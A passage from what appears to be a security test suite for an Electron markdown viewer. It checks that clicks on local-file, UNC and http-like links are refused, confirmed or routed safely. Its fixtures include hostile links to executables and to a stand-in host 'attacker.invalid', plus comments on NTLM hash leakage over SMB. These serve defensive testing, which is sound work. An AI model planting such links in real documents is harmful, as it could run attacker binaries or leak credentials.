      window.__noteFixture.confirmations.push(String(message));
      return false;
    };
  })()`);
  try {
    await render(normSrc, "full", 1500);
    await exec(`
      (() => {
        const img = document.querySelector('#viewer img[alt="space"]');
        if (!img) return false;
        img.dispatchEvent(new MouseEvent('contextmenu', { bubbles: true, cancelable: true }));
        document.getElementById('ctxAddNote').click();
        document.getElementById('noteTitle').value = 'a note';
        document.getElementById('noteSaveBtn').click();
        return true;
      })()
    `);
    await sleep(1500);
    const noteSrc = await exec(`window.originalMarkdown`);
    check(
      "FEATURE add-note-to-image finds an image whose markdown destination marked normalised",
      typeof noteSrc === "string" &&
        noteSrc.includes("noted-image") &&
        !noteSrc.includes("![space]("),
      JSON.stringify(noteSrc),
    );
    let noteSaved = null;
    for (let i = 0; i < 100; i++) {
      const disk = fs.readFileSync(relDoc, "utf8");
      noteSaved = await exec(`(() => {
        const tab = window.CustomTabs.getActiveTab();
        const state = tab && window.CustomTabs.__documentState(tab);
        return {
          id: tab && tab.id,
          path: tab && tab.filePath,
          content: tab && tab.content,
          original: tab && tab.originalContent,
          live: window.originalMarkdown,
          dirty: state && state.dirty,
          markedDirty: tab && tab.hasUnsavedChanges,
          pending: window.getPendingSaveStatus([${JSON.stringify(relDoc)}]).pending,
          alerts: window.__noteFixture.alerts.slice(),
        };
      })()`);
      noteSaved.diskMatches = disk === noteSrc;
      if (noteSaved.id === noteOwner.id &&
          noteSaved.path === relDoc &&
          noteSaved.diskMatches &&
          noteSaved.content === noteSrc &&
          noteSaved.original === noteSrc &&
          noteSaved.live === noteSrc &&
          noteSaved.dirty === false &&
          noteSaved.markedDirty === false &&
          noteSaved.pending === false &&
          noteSaved.alerts.length === 0) break;
      if (noteSaved.alerts.length) break;
      await sleep(50);
    }
    const settled = noteSaved &&
      noteSaved.id === noteOwner.id &&
      noteSaved.path === relDoc &&
      noteSaved.diskMatches &&
      noteSaved.content === noteSrc &&
      noteSaved.original === noteSrc &&
      noteSaved.live === noteSrc &&
      noteSaved.dirty === false &&
      noteSaved.markedDirty === false &&
      noteSaved.pending === false &&
      noteSaved.alerts.length === 0;
    check("the note auto-save settles on its disk-backed tab", settled, JSON.stringify(noteSaved));
    if (!settled) throw new Error("Note auto-save did not settle on its clean owner");
    const closed = await exec(`(async () => {
      await window.CustomTabs.closeTab(${noteOwner.id});
      return {
        removed: !window.CustomTabs.getTabs().some(tab => tab.id === ${noteOwner.id}),
        confirmations: window.__noteFixture.confirmations.slice(),
      };
    })()`);
    check(
      "the saved note tab closes without an unsaved-work confirmation",
      closed.removed && closed.confirmations.length === 0,
      JSON.stringify(closed),
    );
    if (!closed.removed || closed.confirmations.length) {
      throw new Error("Note fixture tab could not close cleanly");
    }
  } finally {
    await exec(`(() => {
      window.alert = window.__noteFixture.alert;
      window.confirm = window.__noteFixture.confirm;
      delete window.__noteFixture;
    })()`);
  }
  await exec(`window.currentFilePath = null; true`);

  // ==========================================================================
  // SEC-12 - a link to a local file was handed straight to shell.openPath()
  //
  // The threat model is a markdown document that arrives with sibling files
  // under the same author's control (a cloned repo, an unpacked archive, a
  // shared folder). hrefs resolve relative to the document's own directory, so
  // "[architecture diagram](./setup.exe)" was one click away from executing an
  // attacker-supplied binary through the system shell - with no prompt, and no
  // indication in the link text that anything but a diagram would open.
  //
  // Every assertion below drives the REAL anchor-click handler on a REAL file
  // on disk; nothing is asserted about source text. shell.openPath, confirm(),
  // ipcRenderer.send and fs.existsSync are stubbed only so the harness can
  // observe what the handler decided to do (and so a native confirm() does not
  // block executeJavaScript forever, as it does in test-tab-refresh.js).
  // ==========================================================================
  const s12dir = path.join(dir, "sec12");
  fs.mkdirSync(s12dir, { recursive: true });
  for (const f of [
    "setup.exe",
    "script.ps1",
    "report.docm",
    "notes.txt",
    "diagram.svg",
    "linked.md",
  ]) {
    fs.writeFileSync(path.join(s12dir, f), "placeholder");
  }
  const s12doc = path.join(s12dir, "doc.md");
  fs.writeFileSync(s12doc, "# doc\n");

  // Held in a const and installed through a helper rather than written inline,
  // because the N11 block below can lose the entire JS context mid-section and
  // has to be able to put this back. See n11Click(). Re-running it is safe: it
  // re-captures __s12Restore from whatever is currently installed, and after a
  // context wipe that is the pristine set.
  const S12_INSTALL = `
    (() => {
      const { shell, ipcRenderer } = require('electron');
      const nodeFs = require('fs');
      window.__s12 = { openPath: [], ipc: [], notes: [], confirms: [], exists: [] };
      window.__s12ConfirmAnswer = false;
      window.__s12Restore = {
        openPath: shell.openPath,
        send: ipcRenderer.send,
        confirm: window.confirm,
        notify: window.showNotification,
        existsSync: nodeFs.existsSync,
      };
      shell.openPath = (p) => { window.__s12.openPath.push(String(p)); return Promise.resolve(''); };
      ipcRenderer.send = function (channel, ...args) {
        if (channel === 'open-file-path') { window.__s12.ipc.push(String(args[0])); return; }
        return window.__s12Restore.send.call(ipcRenderer, channel, ...args);
      };
      // Recorded, then delegated - the handler still needs a truthful answer.
      nodeFs.existsSync = function (p) {
        window.__s12.exists.push(String(p));
        return window.__s12Restore.existsSync.call(nodeFs, p);
      };
      window.showNotification = (m) => { window.__s12.notes.push(String(m)); };
      window.confirm = (m) => {
        window.__s12.confirms.push(String(m));
        return window.__s12ConfirmAnswer === true;
      };
      window.currentFilePath = ${JSON.stringify(s12doc)};
      return null;
    })()
  `;
  await exec(S12_INSTALL);

  // Wipe-safe on purpose. This used to dereference window.__s12 unconditionally
  // and it is the FIRST thing n11Click() does, so when a click below replaced
  // the top frame the reset threw before any recovery could run - and the throw
  // aborted the whole suite from inside a helper whose name says "reset". A
  // helper that cannot survive the condition its caller exists to detect turns
  // a measurable finding into a harness crash.
  const s12Reset = () =>
    exec(`
      (() => {
        const s = window.__s12;
        if (!s) return null;
        s.openPath.length = 0; s.ipc.length = 0;
        s.notes.length = 0; s.confirms.length = 0; s.exists.length = 0;
        return null;
      })()
    `);

  // Click the rendered anchor whose visible text matches, then report what the
  // handler did. Selecting by link text is deliberate: it is the only thing the
  // reader sees, and the whole point of the finding is that it says nothing
  // about what will be opened.
  const s12Click = async (text) => {
    await s12Reset();
    const clicked = await exec(`
      (() => {
        const a = Array.from(document.querySelectorAll('#viewer a'))
          .find((x) => x.textContent.trim() === ${JSON.stringify(text)});
        if (!a) return { found: false };
        a.click();
        return { found: true, href: a.getAttribute('href') };
      })()
    `);
    await sleep(120);
    const state = await exec(`window.__s12`);
    return { ...state, clicked };
  };

  await render(
    [
      "# Local links",
      "",
      "[exe](./setup.exe)",
      "",
      "[ps1](./script.ps1)",
      "",
      "[docm](./report.docm)",
      "",
      "[txt](./notes.txt)",
      "",
      "[svg](./diagram.svg)",
      "",
      "[md](./linked.md)",
      "",
      "[unc](//attacker.invalid/share/payload.txt)",
      "",
    ].join("\n"),
    "full",
  );

  for (const [label, text] of [
    ["Windows executable", "exe"],
    ["PowerShell script", "ps1"],
    ["macro-enabled Office document", "docm"],
  ]) {
    const r = await s12Click(text);
    check(
      `SEC-12 a link to a ${label} is refused outright`,
      r.clicked.found === true &&
        r.openPath.length === 0 &&
        r.ipc.length === 0 &&
        r.confirms.length === 0 &&
        r.notes.length === 1,
      JSON.stringify(r),
    );
  }

  const s12Txt = await s12Click("txt");
  check(
    "FEATURE an inert document (.txt) still opens without a prompt",
    s12Txt.openPath.length === 1 &&
      s12Txt.openPath[0].endsWith("notes.txt") &&
      s12Txt.confirms.length === 0,
    JSON.stringify(s12Txt),
  );

  const s12Md = await s12Click("md");
  check(
    "FEATURE a markdown link still opens inside the app, never via the shell",
    s12Md.ipc.length === 1 &&
      s12Md.ipc[0].endsWith("linked.md") &&
      s12Md.openPath.length === 0,
    JSON.stringify(s12Md),
  );

  // .svg is in neither set: script-capable when the system handler is a
  // browser, but a legitimate thing to link to. It must ask.
  await exec(`window.__s12ConfirmAnswer = false; null`);
  const s12SvgNo = await s12Click("svg");
  check(
    "SEC-12 an unrecognised type asks first, and declining opens nothing",
    s12SvgNo.confirms.length === 1 &&
      s12SvgNo.confirms[0].includes("diagram.svg") &&
      s12SvgNo.openPath.length === 0,
    JSON.stringify(s12SvgNo),
  );

  await exec(`window.__s12ConfirmAnswer = true; null`);
  const s12SvgYes = await s12Click("svg");
  check(
    "FEATURE accepting the prompt opens the unrecognised type",
    s12SvgYes.confirms.length === 1 &&
      s12SvgYes.openPath.length === 1 &&
      s12SvgYes.openPath[0].endsWith("diagram.svg"),
    JSON.stringify(s12SvgYes),
  );
  await exec(`window.__s12ConfirmAnswer = false; null`);

  const s12Unc = await s12Click("unc");
  check(
    "SEC-12 a protocol-relative UNC link is blocked and never reaches the filesystem",
    // The href assertion is load-bearing: without it this would still pass if
    // DOMPurify had stripped the href and the handler never ran at all.
    s12Unc.clicked.href === "//attacker.invalid/share/payload.txt" &&
      s12Unc.notes.length === 1 &&
      s12Unc.openPath.length === 0 &&
      s12Unc.confirms.length === 0 &&
      !s12Unc.exists.some((p) => /attacker\.invalid/i.test(p)),
    JSON.stringify(s12Unc),
  );

  // The backslash form cannot be authored in markdown (marked eats the
  // escapes), so it is injected as a real anchor. What is under test is the
  // handler, not the parser. The ordering assertion is the important half: on
  // Windows, fs.existsSync() on a UNC path opens the SMB connection and leaks
  // an NTLMv2 challenge/response before anything is ever "opened".
  await s12Reset();
  const s12Unc2 = await exec(`
    (async () => {
      const a = document.createElement('a');
      a.setAttribute('href', '\\\\\\\\attacker.invalid\\\\share\\\\payload.txt');
      a.textContent = 'unc2';
      document.getElementById('viewer').appendChild(a);
      a.click();
      await new Promise((r) => setTimeout(r, 120));
      const s = window.__s12;
      a.remove();
      return { openPath: s.openPath.slice(), confirms: s.confirms.slice(), exists: s.exists.slice(), notes: s.notes.slice() };
    })()
  `);
  check(
    "SEC-12 a backslash UNC link is blocked before fs.existsSync() touches the network",
    s12Unc2.openPath.length === 0 &&
      s12Unc2.confirms.length === 0 &&
      s12Unc2.exists.length === 0 &&
      s12Unc2.notes.length === 1,
    JSON.stringify(s12Unc2),
  );

  // --- symlinks and directories -------------------------------------------
  // The policy is decided from the extension, so it has to be decided from the
  // extension of what the link *actually resolves to*. A symlink named
  // diagram.png pointing at payload.ps1 is opened by the shell as the script.
  // Symlinks are ordinary on the macOS and Linux release targets.
  const s12link = path.join(s12dir, "diagram-link.png");
  let symlinksAvailable = true;
  try {
    fs.symlinkSync(path.join(s12dir, "script.ps1"), s12link, "file");
  } catch (e) {
    // Windows needs Developer Mode or SeCreateSymbolicLinkPrivilege.
    symlinksAvailable = false;
    console.log(
      `SKIP  SEC-12 symlink coverage - cannot create a symlink here (${e.code || e.message})`,
    );
    skipped.push("SEC-12 symlink");
  }

  const s12subdir = path.join(s12dir, "subfolder");
  fs.mkdirSync(s12subdir, { recursive: true });

  await render(
    [
      "# Resolution",
      "",
      "[symlink](./diagram-link.png)",
      "",
      "[folder](./subfolder)",
      "",
    ].join("\n"),
    "full",
  );

  if (symlinksAvailable) {
    const s12Sym = await s12Click("symlink");
    check(
      "SEC-12 a symlink with a safe-looking name is judged by its real target",
      s12Sym.clicked.found === true &&
        s12Sym.openPath.length === 0 &&
        s12Sym.confirms.length === 0 &&
        s12Sym.notes.length === 1,
      JSON.stringify(s12Sym),
    );
  }

  const s12Dir = await s12Click("folder");
  check(
    "FEATURE a link to a folder still opens it, and is not mistaken for an executable",
    s12Dir.clicked.found === true &&
      s12Dir.openPath.length === 1 &&
      s12Dir.openPath[0].endsWith("subfolder") &&
      s12Dir.notes.length === 0,
    JSON.stringify(s12Dir),
  );

  // An extensionless file is ambiguous, not automatically hostile. LICENSE,
  // README, Makefile and .bashrc are ordinary link targets; an earlier
  // revision of this fix refused them all outright and told the user they
  // were executables.
  fs.writeFileSync(path.join(s12dir, "LICENSE"), "MIT\n");
  await render("# Ext\n\n[license](./LICENSE)\n", "full");
  await exec(`window.__s12ConfirmAnswer = true; null`);
  const s12Lic = await s12Click("license");
  await exec(`window.__s12ConfirmAnswer = false; null`);
  check(
    "SEC-12 an extensionless file asks rather than being refused as an executable",
    s12Lic.clicked.found === true &&
      s12Lic.confirms.length === 1 &&
      s12Lic.confirms[0].includes("LICENSE") &&
      s12Lic.openPath.length === 1,
    JSON.stringify(s12Lic),
  );

  // ==========================================================================
  // N11 - the click delegation was not TOTAL, and the hole was shaped like a
  // filename.
  //
  // Three arms decide what a click does: `#...` anchors, then http(s), then
  // local files. The http(s) arm tests the RESOLVED url (`link.href`); the
  // local-file arm tested the raw href ATTRIBUTE for `startsWith('http')`. A
  // sibling file called `httpd.md` or `https-notes.txt` satisfies NEITHER - the
  // attribute begins "http" so the local arm skipped it, and it resolves to
  // `file:` so the http arm skipped it too. No preventDefault ran, Chromium
  // followed the link natively, and main.js's will-navigate deny killed the
  // navigation. Net effect for the reader: the link does nothing at all, in
  // silence, with no notification and nothing in the renderer console.
  //
  // These are ordinary filenames - `httpd.conf`, `http-api.md`, `https-setup.md`
  // are exactly the sort of sibling a documentation repo contains - so this is
  // a real "some of my links are dead" bug, not a curiosity.
  //
  // The hrefs below are deliberately BARE (`httpd.md`, not `./httpd.md`). The
  // first draft of this block used the `./` form and all three assertions
  // passed against the unfixed code, because `./httpd.md` does not begin with
  // "http" and so took the local arm normally. The `./` prefix is optional in
  // markdown and most authors omit it, which is precisely why the bug is
  // reachable - and why the assertion has to pin the exact href it clicked.
  //
  // The third assertion is the one that guards the FIX rather than the bug: the
  // local arm is now a genuine catch-all, so it must be proved that an absolute
  // http(s) URL is still taken by the arm above it and never treated as a path.
  // `exists.length === 0` is the load-bearing conjunct there - if the catch-all
  // ever swallowed external URLs, the first observable symptom would be
  // fs.existsSync() being called on "http://probe.invalid/page".
  // ==========================================================================
  fs.writeFileSync(path.join(s12dir, "https-notes.txt"), "placeholder");
  fs.writeFileSync(path.join(s12dir, "httpd.md"), "# httpd\n");

  // Stubbed here rather than in the shared __s12 setup above so that the
  // existing SEC-12 assertions - and the reverts anchored to them - are not
  // disturbed. Restored immediately after this block. Held in a const for the
  // same reason as S12_INSTALL: n11Click() can have to reinstall it.
  const N11_TRAP = `
    (() => {
      const { shell } = require('electron');
      window.__n11External = [];
      window.__n11SavedExternal = shell.openExternal;
      shell.openExternal = (u) => { window.__n11External.push(String(u)); return Promise.resolve(); };
      return null;
    })()
  `;
  await exec(N11_TRAP);

  // The document every carrier below is clicked in. Held in a const because
  // n11Click() re-renders it after a context wipe; a second literal would be
  // free to drift from this one and the recovery would silently start clicking
  // a different document.
  const N11_DOC = [
    "# Totality",
    "",
    "[txt](https-notes.txt)",
    "",
    "[md](httpd.md)",
    "",
    "[web](http://probe.invalid/page)",
    "",
    // An absolute URL Chromium's parser REJECTS - `PORT` is not a number, so
    // the port is invalid. That matters because `link.href` then hands back the
    // attribute verbatim instead of a normalised, lowercased URL, which is the
    // only way an uppercase scheme can reach the arms below. It is what makes
    // ABSOLUTE_WEB_URL's `i` flag load-bearing rather than decorative.
    "[caps](HTTPS://api.example.invalid:PORT/v1)",
    "",
    // Inline SVG, both anchor spellings. Not reachable from markdown link
    // syntax - an SVGAElement can only be authored as raw HTML - which is
    // precisely why it went unhandled for so long.
    '<svg width="10" height="10" xmlns="http://www.w3.org/2000/svg">',
    '<a href="http://svg.invalid/p"><text y="8">svgh</text></a>',
    '<a xlink:href="http://xlink.invalid/p"><text y="8">svgx</text></a>',
    "</svg>",
    "",
  ].join("\n");

  // The fixture currently in the viewer. The recovery inside n11Click() has to
  // rebuild whatever the CALLER rendered, and this section renders three
  // different documents; tracking it here rather than hard-coding N11_DOC in
  // the recovery is what keeps the two in step when a fixture is added later.
  let n11Fixture = N11_DOC;
  const n11Render = async (md) => {
    n11Fixture = md;
    return render(md, "full");
  };

  await n11Render(N11_DOC);

  // The app's own document URL, captured before anything is clicked. Every
  // click below must leave the top frame here. Read rather than constructed:
  // the assertion is "the frame did not move", and a hand-built expectation
  // would be asserting where I think index.html lives.
  const n11BaseHref = await exec(`location.href`);

  // A MAIN-PROCESS WITNESS FOR NAVIGATION, because the renderer-side one is
  // not sufficient on its own. Reading `location.href` and a surviving global
  // after the click proves the frame's FINAL identity; it cannot, by itself,
  // rule out a navigation that started and was still in flight at the moment
  // of observation, nor one that left and came back. `did-start-navigation` is
  // non-cancellable and fires for every main-frame navigation attempt
  // including the ones no cancellable event reports - which is exactly the
  // class N15 is about - so it is the only observation that makes the
  // assertion's name ("never navigates") true rather than approximately true.
  const n11Navs = [];
  // THE POSITIONAL ARGUMENTS ARE DEPRECATED. `node_modules/electron/
  // electron.d.ts` marks `url`, `isInPlace` and `isMainFrame` on
  // `did-start-navigation` as @deprecated in favour of the `details` object.
  // Reading only the positionals is a silent time bomb: on the Electron bump
  // that drops them `isMainFrame` becomes undefined, this array never grows,
  // and every assertion that consumes it passes for the worst possible reason.
  // Read `details` first and fall back, so the witness survives the bump in
  // either direction.
  //
  // `isMainFrame` is the right filter for FALSE NEGATIVES: did-start-navigation
  // is the observer hook for every NavigationRequest, including one committing
  // a blocked or error page, so `about:blank#blocked` cannot reach the top
  // frame without firing it. It is too broad for FALSE POSITIVES - a fragment
  // navigation fires with isMainFrame true - so `isSameDocument` is RECORDED
  // rather than filtered on. Filtering would hide a same-document navigation
  // that no assertion here expects; recording names it in the evidence if one
  // ever appears. (Unreachable today: renderer.js contains no location.hash,
  // pushState, replaceState, location.assign/replace or `location.href =`.)
  const onN11Nav = (details, url, _isInPlace, isMainFrame) => {
    const d = details && typeof details === "object" ? details : null;
    const main = d && typeof d.isMainFrame === "boolean" ? d.isMainFrame : isMainFrame;
    if (main) n11Navs.push({ url: (d && d.url) || url, sameDoc: d ? d.isSameDocument : null });
  };
  win.webContents.on("did-start-navigation", onN11Nav);

  // Reloads performed by the recovery below. Counted so the terminal
  // reconciliation can account for every event the listener saw.
  let n11RecoveryLoads = 0;

  // RECOVERY, EXTRACTED FROM n11Click BECAUSE ITS COVERAGE WAS EXACTLY AS WIDE
  // AS THE CALLS THAT WENT THROUGH THAT HELPER. The section also reads the DOM
  // directly - the SVG shape premise, the empty-href probe, the blank-href
  // probe and the teardown - and every one of those ran against a destroyed
  // document whenever a preceding click had torn the page down. Measured: under
  // R463 the SVG premise `exec` returned [] and broke a mustPass; under R465
  // the same gap surfaced as "harness threw: Error: Script failed to execute".
  // Neither is a product defect. The recovery simply was not reachable from the
  // probe that needed it.
  const n11EnsureAlive = async (why) => {
    // MEASURED, not anticipated: clicking the `caps` carrier with the external
    // arm removed leaves the top frame at `about:blank#blocked` with
    // performance navigation type "navigate". Chromium's URL parser rejects
    // `HTTPS://api.example.invalid:PORT/v1`, so it commits its own blocked page
    // rather than following the link - and that page REPLACES the app's
    // document. Every stub, every observation array and every product global
    // goes with it.
    // THE CONJUNCT LIST IS THE CLAIM. A liveness probe answers only for the
    // globals it names, and this one previously named two SECTION globals and
    // was read as "the document is fully re-armed". It is not: the suite's own
    // error sentinel is installed before run() and is destroyed by the same
    // navigation, so a document could satisfy both conjuncts and still abort
    // the next section. `__e2eErrors` is therefore named here as well - the
    // recorded disjunction disease, in its "an absence check answers for less
    // than it claims" form.
    const alive0 = await exec(
      `typeof window.__s12 !== 'undefined' && typeof window.__n11External !== 'undefined'` +
        ` && typeof window.__e2eErrors !== 'undefined'`,
    );
    if (alive0 === true) return;

    // THE RELOAD IS THE RECOVERY, and its absence was a real defect rather
    // than a missing nicety. The first draft of this branch polled for
    // `renderMarkdown` to reappear - but nothing in this app or this suite
    // ever navigates the main window back: main.js loads index.html exactly
    // once at startup, and its did-fail-load handler (added with the F22
    // shutdown protocol) only records that the renderer can no longer answer a
    // close - it does not reload. Once Chromium commits
    // `about:blank#blocked` in this webContents it STAYS there, so the poll
    // could only ever time out. Measured consequence before the fix: R465
    // reported COLLATERAL with "the renderer was destroyed by a link click
    // and did not come back within 6s", and R463 lost its three trailing
    // assertions because the SVG premise ran against the blocked page and
    // returned []. Both read as harness crashes rather than as the finding.
    await win.loadFile(path.join(__dirname, "..", "src", "index.html"));
    n11RecoveryLoads += 1;

    // Wait for the reloaded renderer to finish booting before reinstalling -
    // renderMarkdown is what the render helper drives, and it is defined late.
    // Polled rather than slept: a fixed sleep here is a bet on machine load,
    // and this suite has lost that bet before.
    let booted = false;
    for (let i = 0; i < 120 && !booted; i++) {
      booted = (await exec(`typeof window.renderMarkdown === 'function'`)) === true;
      if (!booted) await sleep(50);
    }
    if (!booted) {
      // THROWN, NOT check()ed, deliberately. An assertion that only exists when
      // a revert is applied makes the suite's assertion COUNT depend on tree
      // state, which breaks the name-set reconciliation this project relies on.
      //
      // The witness is detached HERE rather than in a finally around the whole
      // section. This is the only live measured path that leaves the section
      // early - every other statement between the attach and the removal is a
      // check() or an exec whose failure aborts the process anyway - so a
      // 500-line reindent would buy nothing except rotted revert anchors. What
      // it does buy is real: the listener's lifetime never outlives the claims
      // it supports, even on the path a revert actually takes.
      win.webContents.removeListener("did-start-navigation", onN11Nav);
      throw new Error(
        "N11: the renderer was destroyed by a link click and did not come back within 6s" +
          ` (${why})`,
      );
    }
    // The shared trap re-arms itself from a did-finish-load listener, which
    // is ASYNCHRONOUS to the loadFile above. Installing N11_TRAP first would
    // be a race whose loser decides what teardown restores: if our stub lands
    // before the rearm, the rearm overwrites it; if the rearm lands after our
    // stub captured `shell.openExternal`, teardown reinstalls the REAL
    // opener into a suite that is still firing hostile links at it. Waiting
    // for the rearm makes the stub layer on top of the trap here exactly as
    // it does on the non-recovery path.
    await waitForExternalTrap(win);
    // Reinstalled BEFORE the section stubs, in the same order the bootstrap
    // established it, so a throw inside S12_INSTALL or N11_TRAP is still
    // recorded by the sentinel rather than lost.
    await exec(E2E_SENTINEL);
    await exec(S12_INSTALL);
    await exec(N11_TRAP);
    // Restore what the CALLER last rendered, not the section's first
    // document. The placeholder and whitespace assertions each render their
    // own fixture, and re-rendering N11_DOC here would silently swap the
    // fixture out from under them - the click would then look for an anchor
    // that is no longer in the DOM and report `found: false`, which reads as
    // "the link vanished" rather than "the recovery rebuilt the wrong page".
    await render(n11Fixture, "full");
  };

  const n11Click = async (text) => {
    // Runs FIRST - before s12Reset(), before anything dereferences a global.
    await n11EnsureAlive(`about to click "${text}"`);

    await s12Reset();
    await exec(`window.__n11External.length = 0; null`);
    // Everything the main process saw before this click belongs to setup (the
    // initial load, and any recovery reload above). Slice from here so the
    // evidence names only navigations THIS click caused.
    const navMark = n11Navs.length;
    const clicked = await exec(`
      (() => {
        const a = Array.from(document.querySelectorAll('#viewer a'))
          .find((x) => (x.textContent || '').trim() === ${JSON.stringify(text)});
        if (!a) return { found: false };
        // dispatchEvent rather than a.click(), because its return value is the
        // only way to see preventDefault() from here. It reports false when the
        // event was cancelled. Without this, a handler that does nothing and a
        // handler that is never reached are indistinguishable - every other
        // observation below is empty in both cases, which is exactly how the
        // first draft of the placeholder assertion managed to be vacuous.
        const ev = new MouseEvent('click', { bubbles: true, cancelable: true, view: window });
        const notCancelled = a.dispatchEvent(ev);
        return {
          found: true,
          href: a.getAttribute('href'),
          prevented: notCancelled === false,
          // WHICH NODE WAS ACTUALLY CLICKED. The selector is by TEXT, so the
          // SVG legs are only testing SVG handling for as long as the fixture
          // keeps spelling those labels inside an <svg>. A future fixture edit
          // adding an ordinary HTML anchor labelled "svgh" would let every
          // behaviour assertion pass while SVG handling was broken - the
          // premise block asserts the SVG shape, but nothing tied the premise
          // to the node the click found. Recorded here so the behaviour
          // assertions can require it themselves.
          svgAnchor: a instanceof SVGAElement,
        };
      })()
    `);
    await sleep(140);
    // Read the frame's own identity BEFORE the observation arrays, because if
    // the frame moved those arrays no longer exist and JSON.stringify silently
    // drops undefined keys - a truncated evidence blob with no explanation.
    const nav = await exec(`
      (() => {
        const n = performance.getEntriesByType('navigation')[0];
        return {
          href: location.href,
          navType: n ? n.type : null,
          alive: typeof window.__s12 !== 'undefined',
        };
      })()
    `);
    // The main-process half of the same question. Recorded on every click, not
    // just the ones that are expected to move, so a surprise navigation is
    // attributed to the click that caused it rather than discovered later.
    nav.mainProcessNavs = n11Navs.slice(navMark);
    const state = (await exec(`window.__s12`)) || {};
    const external = (await exec(`window.__n11External`)) || [];
    return { ...state, external, clicked, nav };
  };

  const n11Txt = await n11Click("txt");
  check(
    "N11 a local file whose name begins with http is opened, not silently ignored",
    // The href conjunct pins the shape of the bug: without it the assertion
    // would still pass if the sanitizer had rewritten the name.
    n11Txt.clicked.found === true &&
      n11Txt.clicked.href === "https-notes.txt" &&
      n11Txt.clicked.prevented === true &&
      n11Txt.openPath.length === 1 &&
      n11Txt.openPath[0].endsWith("https-notes.txt") &&
      n11Txt.external.length === 0 &&
      n11Txt.notes.length === 0,
    JSON.stringify(n11Txt),
  );

  const n11Md = await n11Click("md");
  check(
    "N11 a markdown file whose name begins with http opens in the app",
    n11Md.clicked.found === true &&
      n11Md.clicked.href === "httpd.md" &&
      n11Md.clicked.prevented === true &&
      n11Md.ipc.length === 1 &&
      n11Md.ipc[0].endsWith("httpd.md") &&
      n11Md.openPath.length === 0 &&
      n11Md.external.length === 0,
    JSON.stringify(n11Md),
  );

  const n11Web = await n11Click("web");
  // SPLIT IN TWO on purpose. "was it opened" and "was it stat'd" are different
  // claims about different code, and two reverts depend on telling them apart:
  // R463 deletes the external arm and fails only the first, while R464 deletes
  // the arm AND widens the catch-all so the URL really is resolved against the
  // document directory and handed to fs.existsSync - the only mutation that
  // leaks the reader's filesystem layout. Joined into one assertion both
  // reverts produce an identical verdict and the second finding is invisible.
  check(
    "N11 an absolute http URL is still routed externally",
    n11Web.clicked.found === true &&
      n11Web.clicked.prevented === true &&
      n11Web.external.length === 1 &&
      n11Web.external[0] === "http://probe.invalid/page",
    JSON.stringify(n11Web),
  );
  check(
    "N11 an absolute http URL is never treated as a local path",
    n11Web.openPath.length === 0 && n11Web.ipc.length === 0 && n11Web.exists.length === 0,
    JSON.stringify(n11Web),
  );

  // The uppercase carrier. `HTTPS://api.example.invalid:PORT/v1` has an invalid
  // port, so Chromium's parser rejects it and `link.href` hands back the
  // attribute verbatim rather than a lowercased, normalised URL. Both arms
  // therefore see an uppercase scheme, which is the whole reason
  // ABSOLUTE_WEB_URL carries the `i` flag. Without it this URL matches no arm
  // and reaches the catch-all, which resolves it as a path.
  const n11Caps = await n11Click("caps");
  check(
    "N11 an uppercase unparseable http URL is routed externally, not stat'd as a path",
    n11Caps.clicked.found === true &&
      n11Caps.clicked.prevented === true &&
      n11Caps.external.length === 1 &&
      n11Caps.external[0] === "HTTPS://api.example.invalid:PORT/v1" &&
      n11Caps.openPath.length === 0 &&
      n11Caps.ipc.length === 0 &&
      n11Caps.exists.length === 0,
    JSON.stringify(n11Caps),
  );

  // A PRODUCT CLAIM THAT HAD NEVER BEEN ASSERTED, and it is stronger than
  // "the link is dead".
  //
  // MEASURED: with the external arm removed, this exact click leaves the top
  // frame at `about:blank#blocked`, navigation type "navigate" - Chromium
  // rejected the malformed URL and committed its OWN blocked page over the
  // app's document. Every open tab and every unsaved edit goes with it and the
  // window is left blank with no way back except a restart. So the delegation
  // being TOTAL is not merely tidiness; it is what stops a single click on an
  // ordinary-looking link destroying the reader's session.
  //
  // Note what this does NOT claim. main.js's will-navigate / will-redirect
  // denies do not fire for this URL at all - measured, by the absence of their
  // distinct log lines - so the renderer's totality is the ONLY layer standing
  // here. That gap is recorded as its own finding rather than implied away.
  //
  // THREE CONJUNCTS, AND THE THIRD IS WHY THE NAME IS HONEST. `alive` and
  // `href` together establish the frame's FINAL identity, which is enough for
  // the measured failure (Chromium commits about:blank#blocked and stays
  // there) but would not catch a navigation that left and returned, or one
  // still in flight when the observation was taken 140ms after the click -
  // both of which "never navigates" claims to exclude. mainProcessNavs is a
  // did-start-navigation record kept OUTSIDE the renderer, so it survives the
  // document being destroyed and is independent of the polling interval. It is
  // also the one signal that fires for the unparseable case at all, which is
  // what makes it the right witness rather than merely an extra one.
  check(
    "N11 an unhandled link click never navigates the top frame out of the app",
    n11Caps.nav.alive === true &&
      n11Caps.nav.href === n11BaseHref &&
      Array.isArray(n11Caps.nav.mainProcessNavs) &&
      n11Caps.nav.mainProcessNavs.length === 0,
    JSON.stringify({ nav: n11Caps.nav, base: n11BaseHref }),
  );

  // SVG anchors. An <a> inside inline SVG is an SVGAElement whose `href` is an
  // SVGAnimatedString OBJECT, and the two spellings disagree about which
  // getAttribute answers. The shape is PINNED rather than assumed, because
  // every assertion below is about how the handler copes with it: if a
  // dompurify bump ever started stripping SVG anchors, or Chromium started
  // handing back a plain string, these would pass while testing nothing.
  // THE RECOVERY HAS TO RUN HERE TOO. This is a direct exec, not a click, so
  // it never went through n11Click - and under R463/R465 the caps carrier
  // immediately above destroys the document, leaving this probe to return []
  // against about:blank#blocked and break its own mustPass.
  await n11EnsureAlive("about to read the SVG shape premise");
  const n11SvgShape = await exec(`
    (() => {
      return Array.from(document.querySelectorAll('#viewer svg a')).map((a) => ({
        text: (a.textContent || '').trim(),
        isSvgElement: a.constructor.name,
        hrefIsObject: typeof a.href === 'object' && a.href !== null,
        getAttrHref: a.getAttribute('href'),
        getAttrXlink: a.getAttribute('xlink:href'),
        // baseVal is THE load-bearing value - it is what the handler's
        // normalisation actually reads - so record it rather than only
        // recording that href is an object. Without this the premise pinned
        // the SHAPE of href and said nothing about its CONTENT, while the
        // comment claimed otherwise.
        baseVal:
          a.href && typeof a.href === 'object' && typeof a.href.baseVal === 'string'
            ? a.href.baseVal
            : null,
        closestMatches: a.closest('a, area') === a,
      }));
    })()
  `);
  check(
    "N11 both SVG anchor spellings survive sanitization as SVGAElements the delegation can see",
    Array.isArray(n11SvgShape) &&
      n11SvgShape.length === 2 &&
      n11SvgShape.every(
        (s) =>
          s.isSvgElement === "SVGAElement" && s.hrefIsObject === true && s.closestMatches === true,
      ) &&
      // The asymmetry is the premise the fallback exists for: the xlink form
